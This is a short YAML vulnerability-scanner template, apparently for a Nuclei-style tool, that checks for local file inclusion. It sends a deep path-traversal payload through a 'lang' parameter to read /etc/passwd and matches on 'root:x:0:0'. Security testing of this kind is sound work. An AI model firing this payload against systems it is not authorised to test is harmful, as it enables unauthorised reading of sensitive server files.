id: lfi7-108
name: 'Deep traversal in lang'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via lang'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      lang:
        - '../../../../../../../../../etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
